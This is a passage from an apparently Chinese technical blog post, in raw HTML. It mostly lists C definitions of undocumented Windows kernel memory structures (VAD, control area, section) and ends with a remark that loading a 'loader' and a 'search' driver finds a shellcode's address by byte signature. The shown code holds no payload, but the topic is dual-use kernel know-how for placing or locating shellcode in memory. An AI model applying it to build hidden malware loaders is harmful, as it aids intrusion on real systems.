font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">pragma</span> once</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntifs.h&gt;</span></span><br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _MM_GRAPHICS_VAD_FLAGS        <span style="color: rgb(146, 255, 184);">// 15 elements, 0x4 bytes (sizeof) </span>{<br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      Lock : <span style="color: rgb(255, 115, 253);">1</span>;                   <span style="color: rgb(146, 255, 184);">// 0 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      LockContended : <span style="color: rgb(255, 115, 253);">1</span>;          <span style="color: rgb(146, 255, 184);">// 1 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      DeleteInProgress : <span style="color: rgb(255, 115, 253);">1</span>;       <span style="color: rgb(146, 255, 184);">// 2 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      NoChange : <span style="color: rgb(255, 115, 253);">1</span>;               <span style="color: rgb(146, 255, 184);">// 3 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      VadType : <span style="color: rgb(255, 115, 253);">3</span>;                <span style="color: rgb(146, 255, 184);">// 4 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      Protection : <span style="color: rgb(255, 115, 253);">5</span>;             <span style="color: rgb(146, 255, 184);">// 7 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      PreferredNode : <span style="color: rgb(255, 115, 253);">6</span>;          <span style="color: rgb(146, 255, 184);">// 12 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      PageSize : <span style="color: rgb(255, 115, 253);">2</span>;               <span style="color: rgb(146, 255, 184);">// 18 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      PrivateMemoryAlwaysSet : <span style="color: rgb(255, 115, 253);">1</span>; <span style="color: rgb(146, 255, 184);">// 20 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      WriteWatch : <span style="color: rgb(255, 115, 253);">1</span>;             <span style="color: rgb(146, 255, 184);">// 21 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      FixedLargePageSize : <span style="color: rgb(255, 115, 253);">1</span>;     <span style="color: rgb(146, 255, 184);">// 22 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      ZeroFillPagesOptional : <span style="color: rgb(255, 115, 253);">1</span>;  <span style="color: rgb(146, 255, 184);">// 23 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      GraphicsAlwaysSet : <span style="color: rgb(255, 115, 253);">1</span>;      <span style="color: rgb(146, 255, 184);">// 24 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      GraphicsUseCoherentBus : <span style="color: rgb(255, 115, 253);">1</span>; <span style="color: rgb(146, 255, 184);">// 25 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      GraphicsPageProtection : <span style="color: rgb(255, 115, 253);">3</span>; <span style="color: rgb(146, 255, 184);">// 26 BitPosition                  </span>}MM_GRAPHICS_VAD_FLAGS, * PMM_GRAPHICS_VAD_FLAGS;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _MM_PRIVATE_VAD_FLAGS         <span style="color: rgb(146, 255, 184);">// 15 elements, 0x4 bytes (sizeof) </span>{<br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      Lock : <span style="color: rgb(255, 115, 253);">1</span>;                   <span style="color: rgb(146, 255, 184);">// 0 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      LockContended : <span style="color: rgb(255, 115, 253);">1</span>;          <span style="color: rgb(146, 255, 184);">// 1 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      DeleteInProgress : <span style="color: rgb(255, 115, 253);">1</span>;       <span style="color: rgb(146, 255, 184);">// 2 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      NoChange : <span style="color: rgb(255, 115, 253);">1</span>;               <span style="color: rgb(146, 255, 184);">// 3 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      VadType : <span style="color: rgb(255, 115, 253);">3</span>;                <span style="color: rgb(146, 255, 184);">// 4 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      Protection : <span style="color: rgb(255, 115, 253);">5</span>;             <span style="color: rgb(146, 255, 184);">// 7 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      PreferredNode : <span style="color: rgb(255, 115, 253);">6</span>;          <span style="color: rgb(146, 255, 184);">// 12 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      PageSize : <span style="color: rgb(255, 115, 253);">2</span>;               <span style="color: rgb(146, 255, 184);">// 18 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      PrivateMemoryAlwaysSet : <span style="color: rgb(255, 115, 253);">1</span>; <span style="color: rgb(146, 255, 184);">// 20 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      WriteWatch : <span style="color: rgb(255, 115, 253);">1</span>;             <span style="color: rgb(146, 255, 184);">// 21 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      FixedLargePageSize : <span style="color: rgb(255, 115, 253);">1</span>;     <span style="color: rgb(146, 255, 184);">// 22 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      ZeroFillPagesOptional : <span style="color: rgb(255, 115, 253);">1</span>;  <span style="color: rgb(146, 255, 184);">// 23 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      Graphics : <span style="color: rgb(255, 115, 253);">1</span>;               <span style="color: rgb(146, 255, 184);">// 24 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      Enclave : <span style="color: rgb(255, 115, 253);">1</span>;                <span style="color: rgb(146, 255, 184);">// 25 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      ShadowStack : <span style="color: rgb(255, 115, 253);">1</span>;            <span style="color: rgb(146, 255, 184);">// 26 BitPosition                  </span>}MM_PRIVATE_VAD_FLAGS, * PMM_PRIVATE_VAD_FLAGS;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _MMVAD_FLAGS            <span style="color: rgb(146, 255, 184);">// 9 elements, 0x4 bytes (sizeof) </span>{<br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      Lock : <span style="color: rgb(255, 115, 253);">1</span>;             <span style="color: rgb(146, 255, 184);">// 0 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      LockContended : <span style="color: rgb(255, 115, 253);">1</span>;    <span style="color: rgb(146, 255, 184);">// 1 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      DeleteInProgress : <span style="color: rgb(255, 115, 253);">1</span>; <span style="color: rgb(146, 255, 184);">// 2 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      NoChange : <span style="color: rgb(255, 115, 253);">1</span>;         <span style="color: rgb(146, 255, 184);">// 3 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      VadType : <span style="color: rgb(255, 115, 253);">3</span>;          <span style="color: rgb(146, 255, 184);">// 4 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      Protection : <span style="color: rgb(255, 115, 253);">5</span>;       <span style="color: rgb(146, 255, 184);">// 7 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      PreferredNode : <span style="color: rgb(255, 115, 253);">6</span>;    <span style="color: rgb(146, 255, 184);">// 12 BitPosition                 </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      PageSize : <span style="color: rgb(255, 115, 253);">2</span>;         <span style="color: rgb(146, 255, 184);">// 18 BitPosition                 </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      PrivateMemory : <span style="color: rgb(255, 115, 253);">1</span>;    <span style="color: rgb(146, 255, 184);">// 20 BitPosition                 </span>}MMVAD_FLAGS, * PMMVAD_FLAGS;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _MM_SHARED_VAD_FLAGS            <span style="color: rgb(146, 255, 184);">// 11 elements, 0x4 bytes (sizeof) </span>{<br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      Lock : <span style="color: rgb(255, 115, 253);">1</span>;                     <span style="color: rgb(146, 255, 184);">// 0 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      LockContended : <span style="color: rgb(255, 115, 253);">1</span>;            <span style="color: rgb(146, 255, 184);">// 1 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      DeleteInProgress : <span style="color: rgb(255, 115, 253);">1</span>;         <span style="color: rgb(146, 255, 184);">// 2 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      NoChange : <span style="color: rgb(255, 115, 253);">1</span>;                 <span style="color: rgb(146, 255, 184);">// 3 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      VadType : <span style="color: rgb(255, 115, 253);">3</span>;                  <span style="color: rgb(146, 255, 184);">// 4 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      Protection : <span style="color: rgb(255, 115, 253);">5</span>;               <span style="color: rgb(146, 255, 184);">// 7 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      PreferredNode : <span style="color: rgb(255, 115, 253);">6</span>;            <span style="color: rgb(146, 255, 184);">// 12 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      PageSize : <span style="color: rgb(255, 115, 253);">2</span>;                 <span style="color: rgb(146, 255, 184);">// 18 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      PrivateMemoryAlwaysClear : <span style="color: rgb(255, 115, 253);">1</span>; <span style="color: rgb(146, 255, 184);">// 20 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      PrivateFixup : <span style="color: rgb(255, 115, 253);">1</span>;             <span style="color: rgb(146, 255, 184);">// 21 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      HotPatchAllowed : <span style="color: rgb(255, 115, 253);">1</span>;          <span style="color: rgb(146, 255, 184);">// 22 BitPosition                  </span>}MM_SHARED_VAD_FLAGS, * PMM_SHARED_VAD_FLAGS;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _MMVAD_FLAGS2             <span style="color: rgb(146, 255, 184);">// 7 elements, 0x4 bytes (sizeof) </span>{<br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      FileOffset : <span style="color: rgb(255, 115, 253);">24</span>;        <span style="color: rgb(146, 255, 184);">// 0 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      Large : <span style="color: rgb(255, 115, 253);">1</span>;              <span style="color: rgb(146, 255, 184);">// 24 BitPosition                 </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      TrimBehind : <span style="color: rgb(255, 115, 253);">1</span>;         <span style="color: rgb(146, 255, 184);">// 25 BitPosition                 </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      Inherit : <span style="color: rgb(255, 115, 253);">1</span>;            <span style="color: rgb(146, 255, 184);">// 26 BitPosition                 </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      NoValidationNeeded : <span style="color: rgb(255, 115, 253);">1</span>; <span style="color: rgb(146, 255, 184);">// 27 BitPosition                 </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      PrivateDemandZero : <span style="color: rgb(255, 115, 253);">1</span>;  <span style="color: rgb(146, 255, 184);">// 28 BitPosition                 </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      Spare : <span style="color: rgb(255, 115, 253);">3</span>;              <span style="color: rgb(146, 255, 184);">// 29 BitPosition                 </span>}MMVAD_FLAGS2, * PMMVAD_FLAGS2;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _MMVAD_SHORT{    RTL_BALANCED_NODE VadNode;<br />    UINT32 StartingVpn;               <span style="color: rgb(146, 255, 184);">/*0x18*/</span><br />    UINT32 EndingVpn;                 <span style="color: rgb(146, 255, 184);">/*0x01C*/</span>    UCHAR StartingVpnHigh;    UCHAR EndingVpnHigh;    UCHAR CommitChargeHigh;    UCHAR SpareNT64VadUChar;    INT32 ReferenceCount;<br />    EX_PUSH_LOCK PushLock;            <span style="color: rgb(146, 255, 184);">/*0x028*/</span><br />    <span style="color: rgb(150, 203, 254);">struct</span>    {<br />        <span style="color: rgb(150, 203, 254);">union</span>        {            ULONG_PTR flag;<br />            MM_PRIVATE_VAD_FLAGS PrivateVadFlags;                        <span style="color: rgb(146, 255, 184);">/*0x030*/</span>            MMVAD_FLAGS  VadFlags;            MM_GRAPHICS_VAD_FLAGS GraphicsVadFlags;            MM_SHARED_VAD_FLAGS   SharedVadFlags;        }Flags;    }u1;<br />    PVOID EventList;                        <span style="color: rgb(146, 255, 184);">/*0x038*/</span>}MMVAD_SHORT, * PMMVAD_SHORT;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _MMADDRESS_NODE{    ULONG64 u1;<br />    <span style="color: rgb(150, 203, 254);">struct</span> _MMADDRESS_NODE* LeftChild;<br />    <span style="color: rgb(150, 203, 254);">struct</span> _MMADDRESS_NODE* RightChild;    ULONG64 StartingVpn;    ULONG64 EndingVpn;}MMADDRESS_NODE, * PMMADDRESS_NODE;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _MMEXTEND_INFO     <span style="color: rgb(146, 255, 184);">// 2 elements, 0x10 bytes (sizeof) </span>{<br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT64       CommittedSize;<br />    <span style="color: rgb(146, 255, 184);">/*0x008*/</span>     ULONG32      ReferenceCount;<br />    <span style="color: rgb(146, 255, 184);">/*0x00C*/</span>     UINT8        _PADDING0_[<span style="color: rgb(255, 115, 253);">0x4</span>];}MMEXTEND_INFO, * PMMEXTEND_INFO;<br /><span style="color: rgb(150, 203, 254);">struct</span> _SEGMENT{<br />    <span style="color: rgb(150, 203, 254);">struct</span> _CONTROL_AREA* ControlArea;    ULONG TotalNumberOfPtes;    ULONG SegmentFlags;    ULONG64 NumberOfCommittedPages;    ULONG64 SizeOfSegment;<br />    <span style="color: rgb(150, 203, 254);">union</span>    {<br />        <span style="color: rgb(150, 203, 254);">struct</span> _MMEXTEND_INFO* ExtendInfo;<br />        <span style="color: rgb(255, 255, 182);">void</span>* BasedAddress;    }u;    ULONG64 SegmentLock;    ULONG64 u1;    ULONG64 u2;    PVOID* PrototypePte;<br />    ULONGLONG ThePtes[<span style="color: rgb(255, 115, 253);">0x1</span>];};<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _EX_FAST_REF{<br />    <span style="color: rgb(150, 203, 254);">union</span>    {        PVOID Object;<br />        ULONG_PTR RefCnt : <span style="color: rgb(255, 115, 253);">3</span>;        ULONG_PTR Value;    };} EX_FAST_REF, * PEX_FAST_REF;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _CONTROL_AREA                      <span style="color: rgb(146, 255, 184);">// 17 elements, 0x80 bytes (sizeof) </span>{<br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> _SEGMENT* Segment;<br />    <span style="color: rgb(150, 203, 254);">union</span>                                         <span style="color: rgb(146, 255, 184);">// 2 elements, 0x10 bytes (sizeof)  </span>    {<br />        <span style="color: rgb(146, 255, 184);">/*0x008*/</span>         <span style="color: rgb(150, 203, 254);">struct</span> _LIST_ENTRY ListHead;              <span style="color: rgb(146, 255, 184);">// 2 elements, 0x10 bytes (sizeof)  </span><br />        <span style="color: rgb(146, 255, 184);">/*0x008*/</span>         VOID* AweContext;    };<br />    <span style="color: rgb(146, 255, 184);">/*0x018*/</span>     UINT64       NumberOfSectionReferences;<br />    <span style="color: rgb(146, 255, 184);">/*0x020*/</span>     UINT64       NumberOfPfnReferences;<br />    <span style="color: rgb(146, 255, 184);">/*0x028*/</span>     UINT64       NumberOfMappedViews;<br />    <span style="color: rgb(146, 255, 184);">/*0x030*/</span>     UINT64       NumberOfUserReferences;<br />    <span style="color: rgb(146, 255, 184);">/*0x038*/</span>     ULONG32 u;                     <span style="color: rgb(146, 255, 184);">// 2 elements, 0x4 bytes (sizeof)   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x03C*/</span>     ULONG32 u1;                    <span style="color: rgb(146, 255, 184);">// 2 elements, 0x4 bytes (sizeof)   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x040*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> _EX_FAST_REF FilePointer;              <span style="color: rgb(146, 255, 184);">// 3 elements, 0x8 bytes (sizeof)   </span><br />    <span style="color: rgb(146, 255, 184);">// 4 elements, 0x8 bytes (sizeof)   </span>}CONTROL_AREA, * PCONTROL_AREA;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _SUBSECTION_{<br />    <span style="color: rgb(150, 203, 254);">struct</span> _CONTROL_AREA* ControlArea;}SUBSECTION, * PSUBSECTION;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _MMVAD{    MMVAD_SHORT Core;<br />    <span style="color: rgb(150, 203, 254);">union</span>                 <span style="color: rgb(146, 255, 184);">/*0x040*/</span>    {        UINT32 LongFlags2;<br />        <span style="color: rgb(146, 255, 184);">//现在用不到省略</span>        MMVAD_FLAGS2 VadFlags2;    }u2;<br />    PSUBSECTION Subsection;               <span style="color: rgb(146, 255, 184);">/*0x048*/</span><br />    PVOID FirstPrototypePte;        <span style="color: rgb(146, 255, 184);">/*0x050*/</span><br />    PVOID LastContiguousPte;        <span style="color: rgb(146, 255, 184);">/*0x058*/</span><br />    LIST_ENTRY ViewLinks;           <span style="color: rgb(146, 255, 184);">/*0x060*/</span><br />    PEPROCESS VadsProcess;          <span style="color: rgb(146, 255, 184);">/*0x070*/</span><br />    PVOID u4;                       <span style="color: rgb(146, 255, 184);">/*0x078*/</span><br />    PVOID FileObject;               <span style="color: rgb(146, 255, 184);">/*0x080*/</span>}MMVAD, * PMMVAD;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _RTL_AVL_TREE         <span style="color: rgb(146, 255, 184);">// 1 elements, 0x8 bytes (sizeof) </span>{<br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> _RTL_BALANCED_NODE* Root;}RTL_AVL_TREE, * PRTL_AVL_TREE;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _VAD_INFO_{    ULONG_PTR pVad;    ULONG_PTR startVpn;    ULONG_PTR endVpn;    ULONG_PTR pFileObject;    ULONG_PTR flags;}VAD_INFO, * PVAD_INFO;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _ALL_VADS_{    ULONG nCnt;<br />    VAD_INFO VadInfos[<span style="color: rgb(255, 115, 253);">1</span>];}ALL_VADS, * PALL_VADS;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _MMSECTION_FLAGS                        <span style="color: rgb(146, 255, 184);">// 27 elements, 0x4 bytes (sizeof) </span>{<br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       BeingDeleted : <span style="color: rgb(255, 115, 253);">1</span>;                     <span style="color: rgb(146, 255, 184);">// 0 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       BeingCreated : <span style="color: rgb(255, 115, 253);">1</span>;                     <span style="color: rgb(146, 255, 184);">// 1 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       BeingPurged : <span style="color: rgb(255, 115, 253);">1</span>;                      <span style="color: rgb(146, 255, 184);">// 2 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       NoModifiedWriting : <span style="color: rgb(255, 115, 253);">1</span>;                <span style="color: rgb(146, 255, 184);">// 3 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       FailAllIo : <span style="color: rgb(255, 115, 253);">1</span>;                        <span style="color: rgb(146, 255, 184);">// 4 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       Image : <span style="color: rgb(255, 115, 253);">1</span>;                            <span style="color: rgb(146, 255, 184);">// 5 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       Based : <span style="color: rgb(255, 115, 253);">1</span>;                            <span style="color: rgb(146, 255, 184);">// 6 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       File : <span style="color: rgb(255, 115, 253);">1</span>;                             <span style="color: rgb(146, 255, 184);">// 7 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       AttemptingDelete : <span style="color: rgb(255, 115, 253);">1</span>;                 <span style="color: rgb(146, 255, 184);">// 8 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       PrefetchCreated : <span style="color: rgb(255, 115, 253);">1</span>;                  <span style="color: rgb(146, 255, 184);">// 9 BitPosition                   </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       PhysicalMemory : <span style="color: rgb(255, 115, 253);">1</span>;                   <span style="color: rgb(146, 255, 184);">// 10 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       ImageControlAreaOnRemovableMedia : <span style="color: rgb(255, 115, 253);">1</span>; <span style="color: rgb(146, 255, 184);">// 11 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       Reserve : <span style="color: rgb(255, 115, 253);">1</span>;                          <span style="color: rgb(146, 255, 184);">// 12 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       Commit : <span style="color: rgb(255, 115, 253);">1</span>;                           <span style="color: rgb(146, 255, 184);">// 13 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       NoChange : <span style="color: rgb(255, 115, 253);">1</span>;                         <span style="color: rgb(146, 255, 184);">// 14 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       WasPurged : <span style="color: rgb(255, 115, 253);">1</span>;                        <span style="color: rgb(146, 255, 184);">// 15 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       UserReference : <span style="color: rgb(255, 115, 253);">1</span>;                    <span style="color: rgb(146, 255, 184);">// 16 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       GlobalMemory : <span style="color: rgb(255, 115, 253);">1</span>;                     <span style="color: rgb(146, 255, 184);">// 17 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       DeleteOnClose : <span style="color: rgb(255, 115, 253);">1</span>;                    <span style="color: rgb(146, 255, 184);">// 18 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       FilePointerNull : <span style="color: rgb(255, 115, 253);">1</span>;                  <span style="color: rgb(146, 255, 184);">// 19 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     ULONG32      PreferredNode : <span style="color: rgb(255, 115, 253);">6</span>;                    <span style="color: rgb(146, 255, 184);">// 20 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       GlobalOnlyPerSession : <span style="color: rgb(255, 115, 253);">1</span>;             <span style="color: rgb(146, 255, 184);">// 26 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       UserWritable : <span style="color: rgb(255, 115, 253);">1</span>;                     <span style="color: rgb(146, 255, 184);">// 27 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       SystemVaAllocated : <span style="color: rgb(255, 115, 253);">1</span>;                <span style="color: rgb(146, 255, 184);">// 28 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       PreferredFsCompressionBoundary : <span style="color: rgb(255, 115, 253);">1</span>;   <span style="color: rgb(146, 255, 184);">// 29 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       UsingFileExtents : <span style="color: rgb(255, 115, 253);">1</span>;                 <span style="color: rgb(146, 255, 184);">// 30 BitPosition                  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     UINT32       PageSize64K : <span style="color: rgb(255, 115, 253);">1</span>;                      <span style="color: rgb(146, 255, 184);">// 31 BitPosition                  </span>}MMSECTION_FLAGS, * PMMSECTION_FLAGS;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _SECTION                          <span style="color: rgb(146, 255, 184);">// 9 elements, 0x40 bytes (sizeof) </span>{<br />    <span style="color: rgb(146, 255, 184);">/*0x000*/</span>     <span style="color: rgb(150, 203, 254);">struct</span> _RTL_BALANCED_NODE SectionNode;       <span style="color: rgb(146, 255, 184);">// 6 elements, 0x18 bytes (sizeof) </span><br />    <span style="color: rgb(146, 255, 184);">/*0x018*/</span>     UINT64       StartingVpn;<br />    <span style="color: rgb(146, 255, 184);">/*0x020*/</span>     UINT64       EndingVpn;<br />    <span style="color: rgb(146, 255, 184);">/*0x028*/</span>     <span style="color: rgb(150, 203, 254);">union</span> {        PCONTROL_AREA   ControlArea;        PVOID   FileObject;<br />    }u1;                   <span style="color: rgb(146, 255, 184);">// 4 elements, 0x8 bytes (sizeof)  </span><br />    <span style="color: rgb(146, 255, 184);">/*0x030*/</span>     UINT64       SizeOfSection;<br />    <span style="color: rgb(146, 255, 184);">/*0x038*/</span>     <span style="color: rgb(150, 203, 254);">union</span> {        ULONG32 LongFlags;        MMSECTION_FLAGS Flags;<br />    }u;                    <span style="color: rgb(146, 255, 184);">// 2 elements, 0x4 bytes (sizeof)  </span><br />    <span style="color: rgb(150, 203, 254);">struct</span>                                       <span style="color: rgb(146, 255, 184);">// 3 elements, 0x4 bytes (sizeof)  </span>    {<br />        <span style="color: rgb(146, 255, 184);">/*0x03C*/</span>         ULONG32      InitialPageProtection : <span style="color: rgb(255, 115, 253);">12</span>; <span style="color: rgb(146, 255, 184);">// 0 BitPosition                   </span><br />        <span style="color: rgb(146, 255, 184);">/*0x03C*/</span>         ULONG32      SessionId : <span style="color: rgb(255, 115, 253);">19</span>;             <span style="color: rgb(146, 255, 184);">// 12 BitPosition                  </span><br />        <span style="color: rgb(146, 255, 184);">/*0x03C*/</span>         ULONG32      NoValidationNeeded : <span style="color: rgb(255, 115, 253);">1</span>;     <span style="color: rgb(146, 255, 184);">// 31 BitPosition                  </span>    };<br />}SECTION, * PSECTION;</code></pre><p>先加载 loader 再加载 search，成功输出 shellcode 的地址，特征码匹配前八个字节，在自己的环境只输出了一个地址，如果输出多个地址可以考虑加长特征码。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=d8f8ddb7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePZg5uwZygaU7g3znkd5DUFzJbtq2BmK2AsPMwDqjpaiammrSdWkOcRrw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; 